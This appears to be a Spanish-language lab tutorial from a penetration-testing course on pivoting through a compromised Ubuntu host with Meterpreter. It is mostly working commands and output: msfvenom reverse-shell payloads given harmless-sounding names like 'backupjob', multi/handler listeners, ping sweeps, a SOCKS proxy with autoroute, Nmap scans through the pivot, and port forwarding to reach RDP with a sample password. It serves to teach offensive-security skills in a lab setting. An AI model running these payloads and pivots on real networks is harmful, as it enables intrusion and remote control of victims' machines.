Ahora consideremos un escenario donde tenemos acceso a nuestro shell Meterpreter en el servidor Ubuntu (el host pivotante) y queremos realizar escaneos de enumeración a través del host pivotante, pero queremos aprovechar las conveniencias que nos brindan las sesiones de Meterpreter. En tales casos, aún podemos crear un pivot con nuestra sesión de Meterpreter sin depender del reenvío de puertos SSH. Podemos crear un shell de Meterpreter para el servidor Ubuntu con el siguiente comando, que devolverá un shell en nuestro host de ataque en el puerto `8080`.

### Creating Payload for Ubuntu Pivot Host

```r
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: backupjob
```

Antes de copiar el payload, podemos iniciar un [multi/handler](https://www.rapid7.com/db/modules/exploit/multi/handler/), también conocido como un Generic Payload Handler.

### Configuring & Starting the multi/handler

```r
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
lport => 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:8080 
```

Podemos copiar el archivo binario `backupjob` al host pivotante Ubuntu `over SSH` y ejecutarlo para obtener una sesión de Meterpreter.

### Executing the Payload on the Pivot Host

```r
ubuntu@WebServer:~$ ls

backupjob
ubuntu@WebServer:~$ chmod +x backupjob 
ubuntu@WebServer:~$ ./backupjob
```

Debemos asegurarnos de que la sesión de Meterpreter se establezca correctamente al ejecutar el payload.

### Meterpreter Session Establishment

```r
[*] Sending stage (3020772 bytes) to 10.129.202.64
[*] Meterpreter session 1 opened (10.10.14.18:8080 -> 10.129.202.64:39826 ) at 2022-03-03 12:27:43 -0500
meterpreter > pwd

/home/ubuntu
```

Sabemos que el objetivo de Windows está en la red 172.16.5.0/23. Suponiendo que el firewall en el objetivo de Windows permite solicitudes ICMP, queremos realizar un ping sweep en esta red. Podemos hacerlo usando Meterpreter con el módulo `ping_sweep`, que generará el tráfico ICMP desde el host Ubuntu a la red `172.16.5.0/23`.

### Ping Sweep

```r
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

[*] Performing ping sweep for IP range 172.16.5.0/23
```

También podríamos realizar un ping sweep usando un `for loop` directamente en un host pivotante objetivo que hará ping a cualquier dispositivo en el rango de red que especifiquemos. Aquí hay dos one-liners útiles de ping sweep que podríamos usar para hosts pivotantes basados en Linux y Windows.

### Ping Sweep For Loop on Linux Pivot Hosts

```r
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

### Ping Sweep For Loop Using CMD

```r
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```

### Ping Sweep Using PowerShell

```r
1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}
```

Nota: Es posible que un ping sweep no resulte en respuestas exitosas en el primer intento, especialmente cuando se comunica a través de redes. Esto puede ser causado por el tiempo que toma a un host construir su caché arp. En estos casos, es bueno intentar nuestro ping sweep al menos dos veces para asegurar que la caché arp se construya.

Podrían haber escenarios en los que el firewall de un host bloquee el ping (ICMP), y el ping no nos dé respuestas exitosas. En estos casos, podemos realizar un escaneo TCP en la red 172.16.5.0/23 con Nmap. En lugar de usar SSH para el reenvío de puertos, también podemos usar el módulo de enrutamiento post-explotación de Metasploit `socks_proxy` para configurar un proxy local en nuestro host de ataque. Configuraremos el proxy SOCKS para `SOCKS version 4a`. Esta configuración de SOCKS iniciará un listener en el puerto `9050` y enrutar todo el tráfico recibido a través de nuestra sesión de Meterpreter.

### Configuring MSF's SOCKS Proxy

```r
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

### Confirming Proxy Server is Running

```r
msf6 auxiliary(server/socks_proxy) > jobs

Jobs
====

  Id  Name                           Payload  Payload opts
  --  ----                           -------  ------------
  0   Auxiliary: server/socks_proxy
```

Después de iniciar el servidor SOCKS, configuraremos proxychains para enrutar el tráfico generado por otras herramientas como Nmap a través de nuestro pivot en el host Ubuntu comprometido. Podemos agregar la siguiente línea al final de nuestro archivo `proxychains.conf` ubicado en `/etc/proxychains.conf` si no está allí.

### Adding a Line to proxychains.conf if Needed

```r
socks4 	127.0.0.1 9050
```

Nota: Dependiendo de la versión que esté ejecutando el servidor SOCKS, ocasionalmente podemos necesitar cambiar de socks4 a socks5 en proxychains.conf.

Finalmente, necesitamos decirle a nuestro módulo socks_proxy que enrute todo el tráfico a través de nuestra sesión de Meterpreter. Podemos usar el módulo `post/multi/manage/autoroute` de Metasploit para agregar rutas para la subred 172.16.5.0 y luego enrutar todo nuestro tráfico de proxychains.

### Creating Routes with AutoRoute

```r
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

También es posible agregar rutas con autoroute ejecutando autoroute desde la sesión de Meterpreter.

```r
meterpreter > run autoroute -s 172.16.5.0/23

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.254.0...
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64
[*] Use the -p option to list all active routes
```

Después de agregar la(s) ruta(s) necesaria(s) podemos usar la opción `-p` para listar las rutas activas y asegurarnos de que nuestra configuración se aplique como se espera.

### Listing Active Routes with AutoRoute

```r
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   10.129.0.0         255.255.0.0        Session 1
   172.16.4.0         255.255.254.0      Session 1
   172.16.5.0         255.255.254.0      Session 1
```

Como puedes ver en la salida anterior, la ruta se ha agregado a la red 172.16.5.0/23. Ahora podremos usar proxychains para enrutar nuestro tráfico Nmap a través de nuestra sesión de Meterpreter.

### Testing Proxy & Routing Functionality

```r
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-03 13:40 EST
Initiating Parallel DNS resolution of 1 host. at 13:40
Completed Parallel DNS resolution of 1 host. at 13:40, 0.12s elapsed
Initiating Connect Scan at 13:40
Scanning 172.16.5.19 [1 port]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19 :3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
Completed Connect Scan at 13:40, 0.12s elapsed (1 total ports)
Nmap scan report for 172.16.5.19 
Host is up (0.12s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
```

---

## Port Forwarding

El reenvío de puertos también se puede lograr usando el módulo `portfwd` de Meterpreter. Podemos habilitar un listener en nuestro host de ataque y solicitar a Meterpreter que reenvíe todos los paquetes recibidos en este puerto a través de nuestra sesión de Meterpreter a un host remoto en la red 172.16.5.0/23.

### Portfwd options

```r
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

### Creating Local TCP Relay

```r
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

El comando anterior solicita a la sesión de Meterpreter que inicie un listener en el puerto local (`-l`) `3300` de nuestro host de ataque y reenvíe todos los paquetes al servidor remoto (`-r`) de Windows `172.16.5.19` en el puerto `3389` (`-p`) a través de nuestra sesión de Meterpreter. Ahora, si ejecutamos xfreerdp en nuestro localhost:3300, podremos crear una sesión de escritorio remoto.

### Connecting to Windows Target through localhost

```r
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

### Netstat Output

Podemos usar Netstat para ver información sobre la sesión que recién establecimos. Desde una perspectiva defensiva, podríamos beneficiarnos de usar Netstat si sospechamos que un host ha sido comprometido. Esto nos permite ver cualquier sesión que un host haya establecido.

```r
netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
```

---

## Meterpreter Reverse Port Forwarding

Similar a los reenvíos de puertos locales, Metasploit también puede realizar `reverse port forwarding` con el siguiente comando, donde podríamos querer escuchar en un puerto específico en el servidor comprometido y reenviar todas las shells entrantes desde el servidor Ubuntu a nuestro host de ataque. Iniciaremos un listener en un nuevo puerto en nuestro host de ataque para Windows y solicitaremos al servidor Ubuntu que reenvíe todas las solicitudes recibidas en el puerto `1234` del servidor Ubuntu a nuestro listener en el puerto `8081`.

Podemos crear un reenvío de puerto inverso en nuestro shell existente del escenario anterior usando el siguiente comando. Este comando reenvía todas las conexiones en el puerto `1234` que se ejecutan en el servidor Ubuntu a nuestro host de ataque en el puerto local (`-l`) `8081`. También configuraremos nuestro listener para escuchar en el puerto 8081 para una shell de Windows.

### Reverse Port Forwarding Rules

```r
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

### Configuring & Starting multi/handler

```r
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

Ahora podemos crear un payload de reverse shell que enviará una conexión de vuelta a nuestro servidor Ubuntu en `172.16.5.129`:`1234` cuando se ejecute en nuestro host de Windows. Una vez que nuestro servidor Ubuntu reciba esta conexión, la reenviará a `attack host's ip`:`8081` que configuramos.

### Generating the Windows Payload

```r
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

Finalmente, si ejecutamos nuestro payload en el host de Windows, deberíamos poder recibir una shell desde Windows a través del servidor Ubuntu.

### Establishing the Meterpreter session

```r
[*] Started reverse TCP handler on 0.0.0.0:8081 
[*] Sending stage (200262 bytes) to 10.10.14.18
[*] Meterpreter session 2 opened (10.10.14.18:8081 -> 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500

meterpreter > shell
Process 2336 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

---

Nota: Al iniciar tu objetivo, te pedimos que esperes de 3 a 5 minutos hasta que todo el laboratorio con todas las configuraciones esté configurado para que la conexión a tu objetivo funcione sin problemas.